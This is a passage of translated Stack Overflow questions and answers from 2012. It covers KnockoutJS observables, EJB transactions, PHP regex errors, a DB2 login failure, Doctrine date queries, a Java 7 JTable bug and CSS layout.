 DataGridViewCellStyle  = new DataGridViewCellStyle();
     blue.ForeColor = Color.Blue;

    foreach(UltraGridRow row in maindatagrid.Rows)
    {
    row.DefaultCellStyle = blue;
    } 
```

# knockout.js - KnockoutJS - 如何从计算的 observable 中排除 observable

> ID：11553166
> 
> 赞同：4
> 
> 时间：2012-07-19T02:37:25.493
> 
> 标签：knockout.js

我有一个计算的 observable，它使用 ko.toJS() 从视图模型中发布值（内部 observables）。内部可观察对象之一绑定到文本框。如何防止对文本框的更改自动触发计算出的 observable（即回发）？

```
function viewModel() {
    var self = this;
    self.SearchParams = {
        OrderStatusID: ko.observable(),
        OrderNumber: ko.observable(), // I don't want this observable to trigger the postback
        OrderBy: ko.observable(),
        OrderByDirection: ko.observable(),
        PageIndex: ko.observable(),
        PageSize: ko.observable()
    };

    // This computed observable automatically subscribes to every
    // observable in self.SearchParams. How can I ignore changes to
    // self.SearchParams.OrderNumber?
    ko.computed(function () {
        NS.post({
            url: '/SomeUrl',
            data: ko.toJS(self.SearchParams)
        });
    }).extend({ throttle: 1 });
} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-19T03:43:38.273

Knockout 2.2+ 包含一个`peek`无需订阅即可访问 observables 的功能。因此，您可以执行以下操作：

```
ko.computed(function () {
    var s = self.SearchParams;
    NS.post({
        url: '/SomeUrl',
        data: {
            OrderStatusID: s.OrderStatusID(), 
            OrderNumber: s.OrderNumber.peek(),
            OrderBy: s.OrderBy(),
            OrderByDirection: s.OrderByDirection(),
            PageIndex: s.PageIndex(),
            PageSize: s.PageSize()
        }
    });
}).extend({ throttle: 1 }); 
```

如果你被 Knockout 2.1.0 卡住了，你可以手动扩展 observables 来`peek`像这样添加（感谢 Ryan Niemeyer）：

```
var backdoorObservable = function(initialValue) {
    var _value = initialValue,
        result = ko.observable(initialValue);

    result.peek = function() { return _value; };

    result.subscribe(function(newValue) {
        _value = newValue;
    });

    return result;
}; 
```

然后`backdoorObservable`用于`OrderNumber`：

```
OrderNumber: backdoorObservable() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T23:57:57.387

我写了这个小插件来帮助我解决许多类似的情况：

[https://github.com/ZiadJ/knockoutjs-reactor](https://github.com/ZiadJ/knockoutjs-reactor)

要忽略某些字段，它为您提供了`hide`可以使用的选项，如下所示：

```
ko.watch(SearchParams, { hide: [SearchParams.OrderNumber] }, function () {
    NS.post({
        url: '/SomeUrl',
        data: ko.toJS(SearchParams)
    });
}).extend({ throttle: 1 }); 
```

# jpa - @LocalBean 的方法之间的 EJB 事务

> ID：11553168
> 
> 赞同：0
> 
> 时间：2012-07-19T02:37:37.893
> 
> 标签：jpa, ejb-3.1

我有一个`@Stateless` `@LocalBean`看起来像这样的

```
@LocalBean
@Stateless
class TokenBean {

    public Token signOn() {       <--------+
        /* Do some JPA things. */          |
    }                                      |
                                           |
    public Token logIn() {                 |
        /* Do some JPA things. */          |
        return signOn();           --------+
    }

    @PersistenceContext
    private EntityManager entityManager;
} 
```

内`JTA`，如何在调用其他方法之前在方法中提交事务？我只需要打电话`flush()`吗`entityManager`？（实际上我正在这样做）

我试过`@TransactionAttribute(TransactionAttributeType.REQUIRES_NEW)`了，但我认为这不适合这种情况。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T05:44:29.100

`entityManager.flush()`应该足够了，它会将所有附加的（到当前的持久性上下文）实体同步到数据库。`@TransactionAttribute(TransactionAttributeType.REQUIRES_NEW)`将为您调用的每个方法启动一个新事务，但除非您退出该方法，否则它不会提交您的数据。

# php - PHP preg_replace_callback() 编译失败：丢失）

> ID：11553169
> 
> 赞同：0
> 
> 时间：2012-07-19T02:37:44.573
> 
> 标签：php, compiler-errors, anonymous-function

好的，我确实有这个小助手功能

```
public static function toJSON($arr){
        $json = json_encode($arr);
        return preg_replace_callback('/(?<=:)"function((?:(?!}").)*}"/',
                                    function($string){
                                        return str_replace(array('\"','/','"','n','t'),array('"','/','"','',''),substr($string[0],1,-1));
                                     },$json);
    } 
```

现在我在那里所做的是我为 preg_replace_callback() 函数的回调创建了一个匿名函数，如果我错过了一个括号，我已经检查了 3 次，但我的 IDE（zend studio）似乎没有显示任何未闭合的括号。

我的错误是这个

> preg_replace_callback() 编译失败：在偏移量 30 (X:\xampp\htdocs\aya\protected\xxx\xxxArray.php:180 处丢失)

我哪里错了？

**注意**：这个小辅助函数的目的是让我在我的 json 输出中创建匿名函数。如果您可以向我推荐一个更好的脚本，那对我来说将是一个很大的帮助..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:48:13.960

有一个不闭合的括号

```
'/(?<=:)"function((?:(?!}").)*}"/' 
```

编辑器不会发现它，因为它不会验证字符串中的内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-09T21:33:22.667

我很确定原作者的意思是：

```
'/(?<=:)"function((?:(?!}").)*})"/'
                               ^ 
```

如果您想稍后捕获函数体（带有参数）以进行替换，但是替换函数稍后会使用`0`索引（整个匹配），因此您也可以删除第一个`(`：

```
'/(?<=:)"function(?:(?!}").)*}"/'
                 ^
                 +-- a "(" deleted 
```

这也将起作用（也会消耗更少的内存）。

# jquery - jquery重定向屏幕宽度和设备旋转

> ID：11553170
> 
> 赞同：0
> 
> 时间：2012-07-19T02:37:49.423
> 
> 标签：jquery, redirect

我有一个网站需要显示屏幕宽度低至 480 的主网站，然后切换到移动网站。原始站点很难反向响应，所以这就是我想出的并且它可以工作，除了它需要改进，因为它不会对设备的旋转做出反应。在横向的大型手机上，主站点应显示，然后以纵向返回到手机。我所尝试的一切都破坏了我所做的工作。任何想法如何修改它以响应设备旋转，将不胜感激。

```
<script type="text/javascript">
    $(document).ready(function(){
        if($(window).width() < 480){
            window.location = "http://mobile"
        }
    });
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:50:17.887

```
<script type="text/javascript">
    $(window).on('load resize',function(){
        if($(window).width() < 480){
            window.location = "http://mobile"
        }
    });
</script> 
```

如果您想在加载所有资源之前重定向，请添加 DOM 就绪绑定

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T02:42:27.087

请参阅这篇文章的第一个答案。我认为你需要一个不同的 window.location 命令。

[如何在 JavaScript/jQuery 中重定向到另一个网页？](https://stackoverflow.com/questions/503093/how-can-i-make-a-redirect-page-in-jquery-javascript)

# java - Java - DB2 连接错误 SQL30082N “用户名和/或密码无效”

> ID：11553175
> 
> 赞同：1
> 
> 时间：2012-07-19T02:38:10.217
> 
> 标签：java, db2

我正在尝试从 Java 应用程序连接到远程 IBM DB2 9.7 数据库。连接失败并出现以下错误：

> SQL30082N 安全处理失败，原因是“24”（“用户名和/或密码无效”）。SQLSTATE=08001

这表示用户名和密码有问题。但是，我很确定我使用了正确的用户名和正确的密码。

为了解决这个问题，我已经尝试了以下方法：

*   我在 HP-UX 上，db2 的用户帐户称为“db2inst1”。这应该根据我找到的命名规则工作。
*   SSH 连接到使用完全相同的用户名和密码的机器可以正常工作。
*   一旦以用户 db2inst1 通过 SSH 登录，“db2 connect to SAMPLE”就可以工作了。但是，“db2 connect to SAMPLE user db2inst1”会产生上述错误，即使密码正确。
*   通过google我发现dbm cfg中的“数据库管理器身份验证”必须设置为SERVER。它一直都设置为 SERVER。
*   “db2 get dbm cfg | grep -i auth”产生以下结果：

> ```
>  GSS Plugin for Local Authorization    (LOCAL_GSSPLUGIN) = 
>  Server Connection Authentication          (SRVCON_AUTH) = SERVER   
>  Database manager authentication        (AUTHENTICATION) = SERVER   
>  Alternate authentication           (ALTERNATE_AUTH_ENC) = NOT_SPECIFIED 
>  Cataloging allowed without authority   (CATALOG_NOAUTH) = NO   
>  Trusted client authentication          (TRUST_CLNTAUTH) = CLIENT   
>  Bypass federated authentication            (FED_NOAUTH) = NO 
> ```

编辑：问题仍未解决，但我发现了更多相关信息：

Db2diag 包含以下警告：

> 2012-07-20-06.18.24.445983-360 I122110A443 级别：警告 PID
> ：24470 TID：223 PROC：db2sysc 0 实例：db2inst1 节点：000 DB：示例 APPHDL：0-25775 EDUID：223 EDUUNC 代理（AMPLEdbagent） : DB2 UDB, bsu security, sqlexLogPluginMessage, probe:20 DATA 1: String with size, 67 bytes 用户 db2inst1 的密码验证失败，rc = -2146500507
> 
> 2012-07-20-06.18.24.446251-360 I122554A436 级别：警告 PID
> ：24470 TID：223 PROC：db2sysc 0 实例：db2inst1 节点：000 DB：SAMPLE APPHDL：0-25775 EDUID：223 EDUUNC 代理（AMPLEdbagent） : DB2 UDB, bsu security, sqlexSlsSystemAuthenticate, probe:150 MESSAGE : application id: DATA #1 : String with size, 26 bytes C0A8150A.D350.120720121824

此外，对 SYSPROC 的一些查询也会产生错误。比如这个：

> db2“值 SYSPROC.AUTH_GET_INSTANCE_AUTHID()”

我现在猜测它与访问权限有关。我可以通过使用查询来查看一些权限

> “SELECT * FROM TABLE (SYSPROC.AUTH_LIST_AUTHORITIES_FOR_AUTHID ('db2inst1', 'U') ) 由权威机构订购”

其结果是，CONNECT 对 D_USER 为“N”，但对 D_GROUP 为“Y”。

我猜 D_USER 应该在“Y”上，以便允许连接 db2inst1。因此，我尝试通过使用授予此权利

> db2“将数据库上的连接授予用户 db2inst1”</p>

但没有运气，D_USER 仍然在“N”，错误仍然发生。

还有什么想法我能做什么？

我非常感谢在这个问题上的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-27T10:52:21.440

大家，非常感谢您的想法和建议！我今天终于设法解决了这个问题。解决方案非常简单。密码确实错了。我的实例和数据库是由脚本自动设置的。事实证明，该脚本对操作系统上的 db2inst1 用户帐户和数据库的 db2inst1 用户帐户使用了不同的密码。一直以来，我都不明白这是两个不同的用户帐户，可以有不同的密码。通过安装脚本并将其与在线 db2 安装教程进行比较，我很清楚。再次，非常感谢你:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T04:21:22.320

我怀疑`~db2inst1/sqllib`（特别是`~db2inst1/sqllib/security/db2ckpw`）中的某些文件权限已被更改。

您可以使用该`db2iupdt`实用程序修复此（和其他问题）。当您的实例停止时，您需要以 root 身份运行它。文档：[db2iupdt - 更新实例命令](http://pic.dhe.ibm.com/infocenter/db2luw/v9r7/topic/com.ibm.db2.luw.admin.cmd.doc/doc/r0002060.html)

# android - Android：当我在浏览器中点击一个数字时会打开联系人弹出窗口 - 想要禁用

> ID：11553181
> 
> 赞同：2
> 
> 时间：2012-07-19T02:38:59.330
> 
> 标签：android, sencha-touch, motorola

我有一个使用 sencha touch 2 库用 HTML 5 编写的应用程序。我正在使用带有 android 蜂窝的 motorola xyboard 8.2" 来访问该站点。我的一些下拉菜单和弹出窗口包含数字。当我触摸数字时，会打开一个 android 弹出窗口，建议我将数字添加到我的联系人中。数字是不适用于联系人，我想完全禁用此功能，以便我可以点击数字并且它们不会触发任何内容。

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-01T11:50:54.437

你试过了吗：

```
<meta name="format-detection" content="telephone=no" /> 
```

# php - 在原则 2 中选择日期之间的条目

> ID：11553183
> 
> 赞同：60
> 
> 时间：2012-07-19T02:39:28.700
> 
> 标签：php, date, doctrine-orm, between, query-builder

我会因为这个我没有得到修复的最小错误而发疯。我想在两天之间选择条目，下面的例子说明了我所有的失败：

**选择 1。**

```
$qb->where('e.fecha > ' . $monday->format('Y-m-d'));
$qb->andWhere('e.fecha < ' . $sunday->format('Y-m-d')); 
```

结果（0 个条目）：

```
SELECT r0_.id_reservacion AS id_reservacion0, r0_.fecha AS fecha1, r0_.cliente AS cliente2 
FROM reservacion r0_ 
WHERE (r0_.fecha > 2012 - 07 - 16) AND (r0_.fecha < 2012 - 07 - 22) 
```

**选择 2**

```
$qb->add('where', 'e.fecha between 2012-01-01 and 2012-10-10'); 
```

结果（0 个条目）：

```
SELECT r0_.id_reservacion AS id_reservacion0, r0_.fecha AS fecha1, r0_.cliente AS cliente2 
FROM reservacion r0_ WHERE r0_.fecha 
BETWEEN 2012 - 01 - 01 AND 2012 - 10 - 10 
```

这是我的当前条目表：

```
id      fecha            cliente
1   2012-07-16 00:00:00    2    
2   2012-07-16 13:00:00    4    
3   2012-07-22 23:00:00    4 
```

## **编辑 1**

为了评估 sql 以避免疑虑，我运行了这个查询：

```
$qb->where('e.fecha > ' . $sunday->format('Y-m-d')); 
```

结果（3 个条目）：

```
SELECT r0_.id_reservacion AS id_reservacion0, r0_.fecha AS fecha1, r0_.cliente AS cliente2 
```

所以，看起来sql不是问题。FROM reservacion r0_ WHERE r0_.fecha > 2012 - 07

* * *

## 回答 #1

> 赞同：161
> 
> 时间：2012-09-14T20:27:47.227

你可以这样做……</p>

```
$qb->where('e.fecha BETWEEN :monday AND :sunday')
   ->setParameter('monday', $monday->format('Y-m-d'))
   ->setParameter('sunday', $sunday->format('Y-m-d')); 
```

或者……</p>

```
$qb->where('e.fecha > :monday')
   ->andWhere('e.fecha < :sunday')
   ->setParameter('monday', $monday->format('Y-m-d'))
   ->setParameter('sunday', $sunday->format('Y-m-d')); 
```

* * *

## 回答 #2

> 赞同：44
> 
> 时间：2013-07-27T21:43:59.567

我相信正确的做法是使用查询构建器表达式：

```
$now = new DateTimeImmutable();
$thirtyDaysAgo = $now->sub(new \DateInterval("P30D"));
$qb->select('e')
   ->from('Entity','e')
   ->add('where', $qb->expr()->between(
            'e.datefield',
            ':from',
            ':to'
        )
    )
   ->setParameters(array('from' => $thirtyDaysAgo, 'to' => $now)); 
```

[http://docs.doctrine-project.org/en/latest/reference/query-builder.html#the-expr-class](http://docs.doctrine-project.org/en/latest/reference/query-builder.html#the-expr-class)

编辑：与此处的任何其他答案相比，此方法的优势在于它独立于数据库软件 - 您应该让 Doctrine 处理日期类型，因为它具有处理此类事情的抽象层。

例如，如果您执行诸如以“Ymd”形式添加字符串变量之类的操作，它将在转到 MySQL 以外的数据库平台时中断。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-19T02:51:35.397

 ****```
    编辑：查看其他答案以获得更好的解决方案

```**  **我提供的原始新手方法是（opt1）：

```
$qb->where("e.fecha > '" . $monday->format('Y-m-d') . "'");
$qb->andWhere("e.fecha < '" . $sunday->format('Y-m-d') . "'"); 
```

和（选择2）：

```
$qb->add('where', "e.fecha between '2012-01-01' and '2012-10-10'"); 
```

这既快速又简单，并立即使原始海报生效。

因此接受了答案。

根据评论，这是错误的答案，但很容易犯错误，所以我把它留在这里作为“不该做什么！”

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-08-16T22:25:02.067

看看我如何在参数中格式化我的日期 $jour。这取决于您使用 expr()->like 还是 expr()->lte

```
$qb
        ->select('e')
        ->from('LdbPlanningBundle:EventEntity', 'e')
        ->where(
            $qb->expr()->andX(
                $qb->expr()->orX(
                    $qb->expr()->like('e.start', ':jour1'),
                    $qb->expr()->like('e.end', ':jour1'),
                    $qb->expr()->andX(
                        $qb->expr()->lte('e.start', ':jour2'),
                        $qb->expr()->gte('e.end', ':jour2')
                    )
                ),
                $qb->expr()->eq('e.user', ':user')
            )
        )
        ->andWhere('e.user = :user ')
        ->setParameter('user', $user)
        ->setParameter('jour1', '%'.$jour->format('Y-m-d').'%')
        ->setParameter('jour2', $jour->format('Y-m-d'))
        ->getQuery()
        ->getArrayResult()
    ; 
```****

# rabbitmq - 如何访问 cloudfoundry.com 上的 rabbitmq 控制台？

> ID：11553186
> 
> 赞同：2
> 
> 时间：2012-07-19T02:40:15.020
> 
> 标签：rabbitmq, cloud-foundry

我希望能够为部署在 cloudfoundry 上的应用管理我的 RabbitMQ 队列和交换。我安装了 caldecott，可以通过隧道查看 mySql 和 mongodb，但我无法访问我的 RabbitMQ 服务的管理控制台。[该](http://joe.blog.freemansoft.com/2011/11/accessing-rabbitmq-console-in-cloud.html)站点描述了如何为微云执行此操作，但不适用于 cloudfoundry.com 上已部署的应用程序。

我可以通过隧道连接到 RabbitMQ 服务，但找不到使用该连接的应用程序。由于 RabbitMQ 控制台是基于 http 的，因此我尝试在连接上使用浏览器，但这不起作用。连接信息比端口号更复杂一些。它有一个用户名、密码、名称、通行证和虚拟主机。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-21T19:18:00.060

目前，没有对 CloudFoundry.com 上运行的 RabbitMQ 的 HTTP 访问，并且您无法使用我知道的任何其他客户端通过 caldecott 隧道进行连接 - 管理插件信息在 CloudFoundry.com 本身之外不可用，所以它是无法找到连接的用户和端口。如果您可以在 JIRA (https://cloudfoundry.atlassian.net/secure/Dashboard.jspa) 中打开一个问题，让工程团队意识到这对您来说是个问题，那就太好了。

# php - 带有缩略图的子页面的 Wordpress 列表

> ID：11553187
> 
> 赞同：0
> 
> 时间：2012-07-19T02:40:31.407
> 
> 标签：php, wordpress

我正在帮助一个朋友创建一个网站，但遇到了障碍。

我正在尝试在我的网站的父页面上创建子页面列表。链接到父页面：[http ://www.jonathandavidlange.com/paintings/](http://www.jonathandavidlange.com/paintings/)

我希望 php 获取页面标题、缩略图，并使其成为链接。像这样：[http ://www.jonathandavidlange.com/paintings/block-1-ferragosto-the-cafe/](http://www.jonathandavidlange.com/paintings/block-1-ferragosto-the-cafe/)

事实证明这比我想象的要艰难。这是我到目前为止所拥有的：

```
<?php $pages = get_pages(array('child_of' => 8)); ?> 

            <?php foreach ($pages as $page): ?>
                    <?php echo get_the_post_thumbnail($page->ID, 'thumbnail'); ?>
                    <h1><?php echo $page->post_title; ?></h1>
            <?php endforeach; ?> 
```

截至目前，该页面仅返回单列页面列表，但它们未链接到该页面。

您能提供的任何帮助都会非常好。

谢谢你，方舟

**编辑**：

```
 <<?php $pages = get_pages(array('child_of' => 8)); ?> 

        <?php foreach ($pages as $page): ?>
            <h1><?php echo $page['post_title'] ?></h1>
            <a href="<?php echo $page['guid'] />"><img src="" /></a>
        <?php endforeach; ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T03:29:40.310

那是因为你没有锚/链接。

这是您需要做的。只需用您的变量替换加星标的关键字。

编辑

将图像留空，因为我说过 img 源不在 $pages 数组中。

```
<?php $pages = get_pages(array('child_of' => 8)); ?> 

      <?php foreach ($pages as $page): ?>
          <h1><?php echo $page['post_title'] ?></h1>
          <a href="<?php echo $page['guid'] ?>"><img src="" /></a>
      <?php endforeach; ?> 
```

# java - 在 OS X Lion 上使用 Java 7 中的 JTables 对 setValueAt 的虚假调用？

> ID：11553197
> 
> 赞同：6
> 
> 时间：2012-07-19T02:42:14.793
> 
> 标签：java, swing, osx-lion, java-7

升级到 Lion 和 Java 7 后，我遇到了 JTables 的问题。当我使用箭头键移动选择时，它`setValueAt()`使用空字符串作为编辑值调用。

为了测试这一点，我创建了一个包含表的简单 JFrame，并将以下类设置为其模型。

```
public class SpyModel extends AbstractTableModel {
    public int getColumnCount() { return 5; }
    public int getRowCount() { return 5; }
    public Object getValueAt(int rowIndex, int columnIndex) { return ""; }
    public boolean isCellEditable(int rowIndex, int columnIndex) { return true; }

    public void setValueAt(Object aValue, int rowIndex, int columnIndex) {
        System.out.println(aValue == null ? "null" : "\"" + aValue + "\"");
    }
} 
```

当我在 Java 6 下运行它时，然后使用箭头键在其中移动。它工作正常。例如

```
$ java -version
java version "1.6.0_33"
Java(TM) SE Runtime Environment (build 1.6.0_33-b03-424-11M3720)
Java HotSpot(TM) 64-Bit Server VM (build 20.8-b03-424, mixed mode)
$ java -jar JavaApplication5.jar 
```

但是，当我在 Java 7（在 Lion 上）下运行它并使用箭头键移动选择时，它最终会`setValueAt()`以空字符串调用。

例如

```
$ java -version
java version "1.7.0_05"
Java(TM) SE Runtime Environment (build 1.7.0_05-b06)
Java HotSpot(TM) 64-Bit Server VM (build 23.1-b03, mixed mode)
$ java -jar JavaApplication5.jar 
""
""
""
""
""
$ 
```

我已经搜索了错误，但我没有想出任何东西。这是一个已知问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-15T22:44:43.087

在使用该表格示例时，似乎存在不止一个错误。

我使用了以下 SSCCE，它在 JDK1.6 下按预期工作

```
import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

public class TableBugDemo {
  public static void main( String[] args ) {
    JFrame frame = new JFrame( "TestFrame" );
    final JTable table = new JTable( new SpyModel() );
    table.getSelectionModel().addListSelectionListener( new ListSelectionListener() {
      @Override
      public void valueChanged( ListSelectionEvent e ) {
        Thread.dumpStack();
        System.out.println(table.getSelectedRow());
      }
    } );
    frame.add( table );
    frame.setDefaultCloseOperation( WindowConstants.EXIT_ON_CLOSE );
    frame.pack();
    frame.setVisible( true );
  }

  public static class SpyModel extends DefaultTableModel{
    public SpyModel() {
      super( new String[][]{
          new String[]{ "row1-1", "row1-2", "row1-3"},
          new String[]{ "row2-1", "row2-2", "row2-3"},
          new String[]{ "row3-1", "row3-2", "row3-3"},
          new String[]{ "row4-1", "row4-2", "row4-3"},
      }, new String[]{"col1", "col2", "col3"});
    }

    @Override
    public void setValueAt( Object aValue, int row, int column ) {
      System.out.println( "TableBugDemo$SpyModel.setValueAt" );
      Thread.dumpStack();
      super.setValueAt( aValue, row, column );
    }

    @Override
    public boolean isCellEditable( int row, int column ) {
      return false;
    }
  }
} 
```

然而在 JDK1.7 下：

*   我看到`setValueAt`在使表格可编辑时被调用。但是，不是使用空字符串，而是使用 my 中包含的实际值`TableModel`。这意味着我的数据没有任何变化。唯一令人讨厌的是，在导航过程中，我的表格会不断更新。`setValueAt`解决方法当然是在值根本没有更新时使用快速退出路径调整方法，例如添加

    ```
    if ( ( aValue != null && aValue.equals( getValueAt( row, column ) ) ) ||
         ( aValue == null && getValueAt( row, column ) == null ) ){
      return;
    } 
    ```

*   使用向上和向下箭头导航使选择一次跳转 2 行。Stacktraces 揭示了选择的变化源于`BasicTableUI#Actions`类（这是有道理的，因为这是放置在动作映射中的动作）。奇怪的是，对于一个按键，这个动作会触发两次。这已经解释了为什么选择一次会跳转 2 行。进一步的调试显示，一旦我收到两个不同的`KEY_PRESSED`事件，就按下箭头键。据我所知，这些事件是这样放置的，`EventQueue`与`JTable`. 为了确保，我创建了一个小型 SSCCE，其中不包含`JTable`：

    ```
     import javax.swing.JFrame;
     import javax.swing.WindowConstants;
     import java.awt.AWTEvent;
     import java.awt.EventQueue;
     import java.awt.Toolkit;
     import java.awt.event.AWTEventListener;
     import java.awt.event.KeyEvent;

     public class KeyEventBugDemo {
       public static void main( String[] args ) {
         EventQueue.invokeLater(new Runnable() {
           @Override
           public void run() {
             JFrame testframe = new JFrame( "testframe" );
             testframe.setSize( 300,300 );
             testframe.setDefaultCloseOperation( WindowConstants.EXIT_ON_CLOSE );
             testframe.setVisible( true );
           }
         } );
         Toolkit.getDefaultToolkit().addAWTEventListener( new AWTEventListener() {
           @Override
           public void eventDispatched( AWTEvent event ) {
             if (event instanceof KeyEvent ){
               KeyEvent keyevent = ( KeyEvent ) event;
               System.out.println( "keyevent.getKeyCode() = " + keyevent.getKeyCode() );
               System.out.println( "ID = " + System.identityHashCode( keyevent ) );
               System.out.println( "keyevent = " + keyevent );
             }
           }
         }, AWTEvent.KEY_EVENT_MASK );
       }
     } 
    ```

将焦点放在框架上，然后点击 DOWN_ARROW 会产生以下输出（剥离输出`toString`以保持可读性）

```
keyevent.getKeyCode() = 40
ID = 960135925
keyevent = java.awt.event.KeyEvent[KEY_PRESSED,keyCode=40,...
keyevent.getKeyCode() = 40
ID = 1192754471
keyevent = java.awt.event.KeyEvent[KEY_PRESSED,keyCode=40,...
keyevent.getKeyCode() = 40
ID = 2012032999
keyevent = java.awt.event.KeyEvent[KEY_RELEASED,keyCode=40,... 
```

在这里你可以清楚地看到你得到了两个`KEY_PRESSED`混淆`JTable`. 使用常规字符键时不会发生这种情况

```
keyevent.getKeyCode() = 65
ID = 1023134153
keyevent = java.awt.event.KeyEvent[KEY_PRESSED,keyCode=65,keyText=A,
ID = 914147942
keyevent = java.awt.event.KeyEvent[KEY_TYPED,keyCode=0,keyText=Unknown 
keyevent.getKeyCode() = 65
ID = 986450556
keyevent = java.awt.event.KeyEvent[KEY_RELEASED,keyCode=65,keyText=A,keyChar='a', 
```

查看`KeyEvent`类中的javadoc：

> KEY_TYPED（仅在可以生成有效的 Unicode 字符时生成。）

有道理我`KEY_TYPED`在击中箭头时不会收到该事件，但它会触发`KEY_PRESSED`两次在我看来是一个错误（稍后将为此记录一个错误报告）。一种解决方法可能是拦截这样的事件而不是通过链传递它，但这对我来说听起来像是一个丑陋的黑客攻击。

*编辑*

另一个奇怪的事情。如果您将以下行添加到代码段

```
table.getInputMap( JComponent.WHEN_ANCESTOR_OF_FOCUSED_COMPONENT ).
  put( KeyStroke.getKeyStroke( 'a' ), "selectNextRow" ); 
```

您可以使用`a`跳转到下一行（与默认情况下使用 DOWN_ARROW 触发的操作相同）。由于按下时事件的正确顺序`a`，似乎该`setValueAt`方法也没有被调用。这让我觉得这两个`KEY_PRESSED`事件以某种方式开始了编辑......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-20T11:31:15.190

解决方法是使用：

```
putClientProperty("JTable.autoStartsEdit", Boolean.FALSE); 
```

但在这种情况下，您将无法通过直接键入开始在单元格中进行编辑。您必须使用鼠标开始编辑。我还向 Oracle [http://bugs.sun.com/view_bug.do?bug_id=9006933](http://bugs.sun.com/view_bug.do?bug_id=9006933)发布了一个错误，但它也不可用......似乎他们的系统有问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-30T12:29:18.633

只是一个更新，当我用光标键在 JTable 单元格中移动时，我仍然看到 1.7.0_40 的这个问题，这会导致它清空进入的每个字段。

添加：

```
table.putClientProperty("JTable.autoStartsEdit", Boolean.FALSE) 
```

停止该问题的发生，但是我必须按“Enter”键才能开始编辑。

相反，在您的 Jtables 模型开始时，您检查空字符串并返回将解决该问题

IE

```
 if(Platform.isOSX())
        {
            if(value.equals(""))
            {
                return;
            }
        } 
```

但这确实意味着如果用户真的想清空该更改将被拒绝的字段。在我自己的应用程序中，这不是一个问题，因为我有一个他们使用的单独的 deleteField() 操作。

可以在此处的 OpenJdk 错误跟踪器中找到该问题

[https://bugs.openjdk.java.net/browse/JDK-8025126](https://bugs.openjdk.java.net/browse/JDK-8025126)

目前要等到 Jdk 9 才能修复

# html - CSS3，图像上的 CSS Align 切换开关

> ID：11553199
> 
> 赞同：1
> 
> 时间：2012-07-19T02:42:46.350
> 
> 标签：html, css

在将我的拨动开关与图像对齐时遇到问题，这是我需要的确切描述。[http://jsfiddle.net/9M4gc/](http://jsfiddle.net/9M4gc/)，我的拨动开关正在相应地工作，但我只需要使用 CSS3 来对齐图像上的拨动开关。查看下面的图片。

这是我页面的当前外观： ![在此处输入图像描述](../Images/c0c15b50416f8f0d8856062d4b324672.png)

这是我想要的： ![在此处输入图像描述](../Images/08167ae9da6cba69c76a5ad310f7217b.png)

这意味着我只希望切换开关像上图一样位于图像上。到目前为止，这是我的代码：

HTML：

```
<div class="back" id="toggle"><br/>
<img src="http://i1159.photobucket.com/albums/p637/Apulo_Cosmas/btn_push01c2x.png"/>
<label for="enjoy_web"></label>
<div class="slideThree">
<input type="checkbox" value="None" id="slideThree" name="check" />
<label for="slideThree"></label>
</div>
</div> 
```

CSS：

```
body{
background:#088A08;
margin:auto;           
}

input[id=slideThree] {
visibility: hidden;
}

/* SLIDE THREE */
.slideThree {
width: 120px;
height: 45px;
background: #0101DF;

-webkit-border-radius: 30px;
-moz-border-radius: 30px;
border-radius: 30px;
position: relative;

-webkit-box-shadow: inset 0px 1px 1px rgba(0,0,0,0.5), 0px 1px 0px rgba(255,255,255,0.2);
-moz-box-shadow: inset 0px 1px 1px rgba(0,0,0,0.5), 0px 1px 0px rgba(255,255,255,0.2);
box-shadow: inset 0px 1px 1px rgba(0,0,0,0.5), 0px 1px 0px rgba(255,255,255,0.2);
}

.slideThree:after {
content: 'OFF';
font: 19px/26px Arial, sans-serif;
color: #fff;
position: absolute;
right: 10px;
z-index: 0;
font-weight: bold;
text-shadow: 1px 1px 0px rgba(255,255,255,.15);
}

.slideThree:before {
content: 'ON';
font: 19px/26px Arial, sans-serif;
color: #fff;
position: absolute;
left: 10px;
z-index: 0;
font-weight: bold;
}

.slideThree label {
display: block;
width: 50px;
height: 40px;

-webkit-border-radius: 50px;
-moz-border-radius: 50px;
border-radius: 50px;

-webkit-transition: all .4s ease;
-moz-transition: all .4s ease;
-o-transition: all .4s ease;
-ms-transition: all .4s ease;
transition: all .10s ease;
cursor: pointer;
position: absolute;
top: 3px;
left: 3px;
z-index: 1;

-webkit-box-shadow: 0px 2px 5px 0px rgba(0,0,0,0.3);
-moz-box-shadow: 0px 2px 5px 0px rgba(0,0,0,0.3);
box-shadow: 0px 2px 5px 0px rgba(0,0,0,0.3);
background: #fcfff4;
background: -webkit-linear-gradient(top, #fcfff4 0%, #dfe5d7 40%, #b3bead 100%);
background: -moz-linear-gradient(top, #fcfff4 0%, #dfe5d7 40%, #b3bead 100%);
background: -o-linear-gradient(top, #fcfff4 0%, #dfe5d7 40%, #b3bead 100%);
background: -ms-linear-gradient(top, #fcfff4 0%, #dfe5d7 40%, #b3bead 100%);
background: linear-gradient(top, #fcfff4 0%, #dfe5d7 40%, #b3bead 100%);
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#fcfff4',       endColorstr='#b3bead',GradientType=0 );
}

.slideThree input[type=checkbox]:checked + label {
left: 68px;
} 
```

可以在[http://jsfiddle.net/9M4gc/](http://jsfiddle.net/9M4gc/)查看工作演示，提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:54:58.577

为什么不将图像设置为背景，并将切换开关放置在父 div 中？

